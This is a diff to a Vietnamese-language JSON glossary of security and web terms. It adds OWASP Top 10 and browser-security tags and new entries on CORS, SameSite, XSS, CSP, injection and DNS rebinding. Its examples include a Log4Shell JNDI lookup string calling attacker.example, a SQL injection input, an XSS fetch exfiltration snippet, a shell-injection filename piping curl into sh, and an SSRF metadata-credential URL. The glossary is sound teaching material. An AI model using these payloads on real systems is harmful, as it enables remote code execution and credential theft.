@@ -1301,7 +1301,7 @@
       "meaning": "Lỗ hổng khi dữ liệu người dùng được ghép vào câu SQL và trở thành cú pháp, cho phép đọc hoặc sửa dữ liệu ngoài ý muốn.",
       "example": "Input `' OR '1'='1` biến điều kiện thành luôn đúng.",
       "related": ["prepared-statement"],
-      "topics": ["jdbc-basics"]
+      "topics": ["jdbc-basics", "owasp-top10"]
     },
     {
       "id": "fetch-size",
@@ -3245,7 +3245,7 @@
       "meaning": "Định dạng body lỗi chuẩn cho HTTP API theo RFC 9457, gồm `type`, `title`, `status`, `detail`, `instance`; Spring 6 có class `ProblemDetail` và `ErrorResponse`.",
       "example": "`ProblemDetail.forStatusAndDetail(HttpStatus.CONFLICT, \"Đơn đã thanh toán\")`.",
       "related": ["dispatcher-servlet"],
-      "topics": ["spring-mvc-flow", "clean-hexagonal", "service-communication", "rest-api-design"]
+      "topics": ["spring-mvc-flow", "clean-hexagonal", "service-communication", "rest-api-design", "owasp-top10"]
     },
     {
       "id": "mass-assignment",
@@ -3442,10 +3442,10 @@
     {
       "id": "csrf",
       "term": "CSRF",
-      "meaning": "Cross-Site Request Forgery: trang lạ khiến trình duyệt gửi request kèm cookie đăng nhập tới ứng dụng mà người dùng đang đăng nhập. Chống bằng token CSRF hoặc cookie `SameSite`.",
+      "meaning": "Cross-Site Request Forgery: trang lạ khiến trình duyệt gửi request kèm cookie đăng nhập tới ứng dụng mà người dùng đang đăng nhập. Chống bằng token CSRF (hoặc kiểm `Origin`/`Sec-Fetch-Site`); cookie `SameSite` là lớp phụ, không thay thế.",
       "example": "Form ẩn trên trang độc hại tự submit `POST /transfer` tới ngân hàng đang đăng nhập trong cùng trình duyệt.",
       "related": ["security-filter-chain"],
-      "topics": ["spring-security-architecture", "realtime-rpc-protocols"]
+      "topics": ["spring-security-architecture", "realtime-rpc-protocols", "browser-security-basics", "owasp-top10"]
     },
     {
       "id": "api-gateway",
@@ -5453,7 +5453,7 @@
       "meaning": "Insecure Direct Object Reference: lỗi bảo mật khi API trả đối tượng theo ID trong request mà không kiểm tra người gọi có quyền với đối tượng đó.",
       "example": "Đổi `/orders/1001` thành `/orders/1002` và xem được đơn của người khác.",
       "related": [],
-      "topics": ["clocks-ids", "design-id-generator", "multi-tenancy", "authn-authz-basics"]
+      "topics": ["clocks-ids", "design-id-generator", "multi-tenancy", "authn-authz-basics", "owasp-top10"]
     },
     {
       "id": "leap-second",
@@ -6749,7 +6749,7 @@
       "meaning": "HTTP Strict Transport Security: header bắt trình duyệt chỉ dùng HTTPS cho domain trong một khoảng thời gian, chặn tấn công hạ cấp xuống HTTP.",
       "example": "`Strict-Transport-Security: max-age=31536000; includeSubDomains`; muốn bảo vệ cả lần truy cập đầu thì đăng ký danh sách preload.",
       "related": ["tls-termination"],
-      "topics": ["tls-https"]
+      "topics": ["tls-https", "browser-security-basics"]
     },
     {
       "id": "http2-stream",
@@ -7517,7 +7517,7 @@
       "meaning": "Lỗ hổng CVE-2021-44228 của `log4j-core` 2.0-beta9 tới 2.14.1: lookup `${jndi:...}` trong message cho phép kẻ tấn công làm server tải và chạy code từ xa.",
       "example": "Gửi header `User-Agent: ${jndi:ldap://attacker.example/a}` tới service ghi log header đó.",
       "related": ["jndi"],
-      "topics": ["java-logging"]
+      "topics": ["java-logging", "owasp-top10"]
     },
     {
       "id": "jndi",
@@ -7877,7 +7877,7 @@
       "meaning": "Chuỗi class có sẵn trên classpath mà các hook khi deserialize (`readObject`, `hashCode`, `compare`) gọi nhau, cuối cùng chạy lệnh tuỳ ý. Kẻ tấn công chỉ cần gửi byte đúng hình dạng.",
       "example": "Chuỗi `InvokerTransformer` của Apache Commons Collections 3.x (2015) dẫn tới `Runtime.exec`.",
       "related": ["java-serialization", "object-input-filter"],
-      "topics": ["serialization-security"]
+      "topics": ["serialization-security", "owasp-top10"]
     },
     {
       "id": "object-input-filter",
@@ -8893,7 +8893,7 @@
       "meaning": "Web Application Firewall: lớp lọc HTTP đứng trước ứng dụng (thường ở CDN hoặc load balancer), chặn theo IP, mẫu tấn công và hạn mức request. Nó không biết khách hàng nào hay kết quả xử lý của ứng dụng.",
       "example": "Luật WAF chặn một IP gửi quá vài nghìn request trong 5 phút trước khi request chạm gateway.",
       "related": ["rate-limiting", "cdn", "api-gateway"],
-      "topics": ["design-rate-limiter", "enterprise-architecture"]
+      "topics": ["design-rate-limiter", "enterprise-architecture", "owasp-top10"]
     },
     {
       "id": "shadow-mode",
@@ -8909,7 +8909,7 @@
       "meaning": "Khi thành phần kiểm tra (kho bộ đếm, dịch vụ phân quyền) lỗi thì cho request đi qua thay vì chặn. Ngược lại là fail closed: lỗi thì chặn.",
       "example": "Redis của rate limiter chết: gateway fail open sang token bucket cục bộ để API vẫn chạy, kèm cảnh báo.",
       "related": ["rate-limiting", "circuit-breaker"],
-      "topics": ["design-rate-limiter"]
+      "topics": ["design-rate-limiter", "owasp-top10"]
     },
     {
       "id": "api-quota",
@@ -11157,7 +11157,7 @@
       "meaning": "Server-side request forgery: kẻ tấn công khiến server gửi request tới đích do họ chọn, thường là địa chỉ nội bộ hay metadata service mà từ ngoài không với tới được.",
       "example": "Service xem trước link nhận `http://169.254.169.254/latest/meta-data/iam/security-credentials/...` và trả về credential của máy.",
       "related": ["imds", "defense-in-depth"],
-      "topics": ["security-architecture"]
+      "topics": ["security-architecture", "owasp-top10"]
     },
     {
       "id": "imds",
@@ -11165,7 +11165,7 @@
       "meaning": "Instance Metadata Service của EC2 tại `169.254.169.254`, trả thông tin máy và credential tạm của role gắn với máy. IMDSv2 bắt phải lấy token bằng `PUT` trước, chặn phần lớn SSRF dạng GET.",
       "example": "`HttpTokens=required` và hop limit 1 làm pod trong container không lấy được credential của node.",
       "related": ["ssrf", "workload-identity"],
-      "topics": ["security-architecture"]
+      "topics": ["security-architecture", "owasp-top10"]
     },
     {
       "id": "kms",
@@ -11837,7 +11837,7 @@
       "meaning": "Software Bill of Materials: danh sách mọi thành phần và phiên bản trong một bản build (thư viện, gói hệ điều hành), dùng để tra CVE và license.",
       "example": "Sinh SBOM CycloneDX trong pipeline; khi có CVE mới, tra ngay ứng dụng nào dùng thư viện đó.",
       "related": ["tech-radar"],
-      "topics": ["enterprise-architecture"]
+      "topics": ["enterprise-architecture", "owasp-top10"]
     },
     {
       "id": "architecture-waiver",
@@ -12061,7 +12061,7 @@
       "meaning": "Trạng thái đăng nhập lưu ở server, gắn với một id ngẫu nhiên mà trình duyệt gửi lại qua cookie mỗi request. Xoá session là thu hồi ngay.",
       "example": "Spring Session lưu session ở Redis để mọi instance đều đọc được sau khi người dùng đăng nhập.",
       "related": ["session-fixation", "sticky-session", "jwt"],
-      "topics": ["authn-authz-basics"]
+      "topics": ["authn-authz-basics", "browser-security-basics"]
     },
     {
       "id": "password-hashing",
@@ -12214,6 +12214,166 @@
       "example": "GenerateDataKey trả khoá rõ để mã hoá tại chỗ và khoá đã bọc để lưu.",
       "related": ["kms", "symmetric-encryption", "crypto-shredding"],
       "topics": ["cryptography-basics"]
+    },
+    {
+      "id": "web-origin",
+      "term": "Origin",
+      "meaning": "Bộ ba scheme + host + port của một URL. Trình duyệt coi hai URL là cùng origin chỉ khi cả ba trùng nhau.",
+      "example": "`https://app.shop.example.com` và `https://app.shop.example.com:8443` là hai origin khác nhau vì khác port.",
+      "related": ["site", "same-origin-policy"],
+      "topics": ["browser-security-basics"]
+    },
+    {
+      "id": "site",
+      "term": "Site",
+      "meaning": "Scheme + tên miền đăng ký được (eTLD+1, tính theo Public Suffix List). Các tên miền con của cùng một tên miền là cùng site dù khác origin; `SameSite` của cookie so theo site.",
+      "example": "`https://help.shop.example.com` và `https://app.shop.example.com` cùng site `example.com`; `a.github.io` và `b.github.io` khác site vì `github.io` là public suffix.",
+      "related": ["web-origin", "samesite"],
+      "topics": ["browser-security-basics"]
+    },
+    {
+      "id": "same-origin-policy",
+      "term": "Same-origin policy",
+      "meaning": "Quy tắc của trình duyệt: JavaScript của một origin không được đọc response, DOM hay storage của origin khác. Nó chặn đọc, không chặn gửi request.",
+      "example": "Trang `evil.example.net` gửi được form tới ngân hàng, nhưng `fetch` của nó không đọc được số dư trả về.",
+      "related": ["web-origin", "cors"],
+      "topics": ["browser-security-basics"]
+    },
+    {
+      "id": "cors",
+      "term": "CORS",
+      "meaning": "Cross-Origin Resource Sharing: cơ chế để server cho phép JavaScript của origin khác đọc response, bằng header `Access-Control-Allow-Origin` và các header liên quan. Nó nới lỏng same-origin policy, không phải lớp bảo vệ server.",
+      "example": "API trả `Access-Control-Allow-Origin: https://app.shop.example.com` và `Access-Control-Allow-Credentials: true` để SPA ở origin đó đọc được dữ liệu có cookie.",
+      "related": ["same-origin-policy", "cors-preflight", "csrf"],
+      "topics": ["browser-security-basics"]
+    },
+    {
+      "id": "cors-preflight",
+      "term": "Preflight",
+      "meaning": "Request `OPTIONS` trình duyệt tự gửi trước một request cross-origin không phải simple request (JSON, header tự đặt, `PUT`/`DELETE`), để hỏi server có cho phép không. Preflight không mang cookie.",
+      "example": "`fetch` POST JSON tới API khác origin: server thấy `OPTIONS` với `Access-Control-Request-Method: POST` trước, không cho phép thì POST không được gửi.",
+      "related": ["cors"],
+      "topics": ["browser-security-basics"]
+    },
+    {
+      "id": "samesite",
+      "term": "SameSite",
+      "meaning": "Thuộc tính cookie quyết định cookie có được gửi kèm request đến từ site khác không: `Strict` không gửi, `Lax` chỉ gửi khi điều hướng `GET`, `None` (cần `Secure`) luôn gửi.",
+      "example": "`Set-Cookie: SESSION=...; Secure; HttpOnly; SameSite=Lax`: form POST từ `evil.example.net` không mang cookie, nhưng từ `help.shop.example.com` cùng site thì có.",
+      "related": ["csrf", "site", "cookie-prefix"],
+      "topics": ["browser-security-basics"]
+    },
+    {
+      "id": "cookie-prefix",
+      "term": "Cookie prefix",
+      "meaning": "Tiền tố tên cookie mà trình duyệt bắt buộc điều kiện: `__Secure-` phải có `Secure`; `__Host-` phải có `Secure`, `Path=/` và không có `Domain`, nên tên miền con không ghi đè được.",
+      "example": "`server.servlet.session.cookie.name=__Host-SESSION` trong Spring Boot.",
+      "related": ["samesite"],
+      "topics": ["browser-security-basics"]
+    },
+    {
+      "id": "xss",
+      "term": "XSS",
+      "meaning": "Cross-site scripting: dữ liệu do kẻ tấn công kiểm soát được trình duyệt chạy như script trong trang của ứng dụng, nên script có toàn quyền của người dùng trên origin đó.",
+      "example": "Bình luận chứa `<img src=x onerror=fetch(...)>` được hiển thị không escape: ai mở trang cũng bị gửi dữ liệu ra ngoài.",
+      "related": ["csp", "same-origin-policy"],
+      "topics": ["browser-security-basics", "owasp-top10"]
+    },
+    {
+      "id": "csp",
+      "term": "CSP",
+      "meaning": "Content-Security-Policy: header khai báo trình duyệt được nạp và chạy tài nguyên từ đâu. `script-src` với nonce ngăn script bị chèn chạy, giảm thiệt hại khi có XSS.",
+      "example": "`Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'`.",
+      "related": ["xss", "clickjacking"],
+      "topics": ["browser-security-basics"]
+    },
+    {
+      "id": "clickjacking",
+      "term": "Clickjacking",
+      "meaning": "Trang độc nhúng ứng dụng vào iframe trong suốt và dụ người dùng bấm vào nút thật của ứng dụng. Chống bằng `X-Frame-Options` hoặc CSP `frame-ancestors`.",
+      "example": "Nút \"Nhận quà\" của trang độc nằm đè lên nút \"Xác nhận chuyển tiền\" trong iframe ẩn.",
+      "related": ["csp"],
+      "topics": ["browser-security-basics"]
+    },
+    {
+      "id": "fetch-metadata",
+      "term": "Fetch Metadata",
+      "meaning": "Nhóm header `Sec-Fetch-*` trình duyệt gửi kèm request (chỉ tới HTTPS hoặc localhost), cho server biết request đến từ đâu (`Sec-Fetch-Site`: `same-origin`, `same-site`, `cross-site`, `none`) và mục đích gì.",
+      "example": "Filter từ chối `POST` có `Sec-Fetch-Site: cross-site` để chặn CSRF.",
+      "related": ["csrf", "site"],
+      "topics": ["browser-security-basics"]
+    },
+    {
+      "id": "third-party-cookie",
+      "term": "Cookie bên thứ ba",
+      "meaning": "Cookie của site khác với site trên thanh địa chỉ, ví dụ cookie của widget nhúng iframe. Safari và Firefox chặn hoặc phân vùng mặc định; Chrome vẫn cho phép tuỳ lựa chọn của người dùng.",
+      "example": "Widget chat nhúng vào `shop.example.com` từ `chat.example.net` không giữ được đăng nhập trên Safari.",
+      "related": ["samesite"],
+      "topics": ["browser-security-basics"]
+    },
+    {
+      "id": "owasp-top-10",
+      "term": "OWASP Top 10",
+      "meaning": "Danh sách mười nhóm rủi ro bảo mật ứng dụng web phổ biến nhất do tổ chức OWASP công bố định kỳ (bản mới nhất 2025). Dùng để nâng nhận thức và ưu tiên, không phải tiêu chuẩn kiểm thử đầy đủ (đó là ASVS).",
+      "example": "A01:2025 Broken Access Control, A05:2025 Injection, A10:2025 Mishandling of Exceptional Conditions.",
+      "related": ["broken-access-control", "injection"],
+      "topics": ["owasp-top10"]
+    },
+    {
+      "id": "broken-access-control",
+      "term": "Broken Access Control",
+      "meaning": "Nhóm lỗi để người dùng làm được việc ngoài quyền: xem hay sửa dữ liệu của người khác, gọi endpoint admin, CSRF, SSRF. Đứng đầu OWASP Top 10 từ 2021.",
+      "example": "`GET /orders/1002` trả đơn của người khác vì server chỉ kiểm đã đăng nhập.",
+      "related": ["idor", "csrf", "ssrf"],
+      "topics": ["owasp-top10"]
+    },
+    {
+      "id": "injection",
+      "term": "Injection",
+      "meaning": "Nhóm lỗi khi dữ liệu do người dùng kiểm soát được ghép vào một ngôn ngữ khác (SQL, lệnh shell, biểu thức, template, HTML) và trở thành cú pháp của ngôn ngữ đó.",
+      "example": "`Runtime.exec(\"sh -c convert \" + file)` với tên file `a.png; curl ... | sh`.",
+      "related": ["sql-injection", "xss", "output-encoding"],
+      "topics": ["owasp-top10"]
+    },
+    {
+      "id": "output-encoding",
+      "term": "Output encoding",
+      "meaning": "Escape dữ liệu ngay lúc ghi ra, theo đúng ngữ cảnh đích (nội dung HTML, thuộc tính, JavaScript, URL, CSS), để dữ liệu luôn được hiểu là văn bản. Đây là cách chính chống XSS, thay vì lọc input.",
+      "example": "Thymeleaf `th:text` biến `<script>` thành `&lt;script&gt;`; `th:utext` thì ghi nguyên.",
+      "related": ["xss", "injection"],
+      "topics": ["owasp-top10"]
+    },
+    {
+      "id": "dns-rebinding",
+      "term": "DNS rebinding",
+      "meaning": "Tên miền do kẻ tấn công kiểm soát trả IP công khai lúc server kiểm tra, rồi trả IP nội bộ lúc server kết nối thật, nhờ TTL rất ngắn. Vượt được bộ lọc SSRF kiểm tên miền rồi phân giải lại.",
+      "example": "Lần phân giải đầu ra `203.0.113.10` (qua kiểm tra), lần thứ hai ra `169.254.169.254`.",
+      "related": ["ssrf"],
+      "topics": ["owasp-top10"]
+    },
+    {
+      "id": "simple-request",
+      "term": "Simple request",
+      "meaning": "Request cross-origin mà trình duyệt gửi thẳng, không preflight: `GET`/`HEAD`/`POST`, chỉ header an toàn, `Content-Type` là form urlencoded, `multipart/form-data` hoặc `text/plain`. Form HTML luôn tạo được loại này.",
+      "example": "`fetch(url, {method: \"POST\", body: new URLSearchParams(...)})` từ trang khác tới thẳng server, cookie đi kèm nếu `SameSite` cho phép.",
+      "related": ["cors-preflight", "cors", "csrf"],
+      "topics": ["browser-security-basics"]
+    },
+    {
+      "id": "cookie-tossing",
+      "term": "Cookie tossing",
+      "meaning": "Tên miền con (bị chiếm hay chứa nội dung người dùng) đặt cookie với `Domain` là tên miền cha, ghi đè hay chen cookie cùng tên của ứng dụng chính, ví dụ cookie session hay CSRF.",
+      "example": "`help.shop.example.com` đặt `XSRF-TOKEN=attacker; Domain=shop.example.com` để vượt double-submit cookie của `app.shop.example.com`.",
+      "related": ["cookie-prefix", "site"],
+      "topics": ["browser-security-basics"]
+    },
+    {
+      "id": "csp-nonce",
+      "term": "CSP nonce",
+      "meaning": "Giá trị ngẫu nhiên sinh mới cho mỗi response, đặt trong `script-src` của CSP và trên các thẻ `<script nonce>` hợp lệ; script không mang đúng nonce không được chạy.",
+      "example": "`Content-Security-Policy: script-src 'nonce-q7Xb3...' 'strict-dynamic'` và `<script nonce=\"q7Xb3...\" src=\"/app.js\">`.",
+      "related": ["csp", "xss"],
+      "topics": ["browser-security-basics"]
     }
   ]
 }
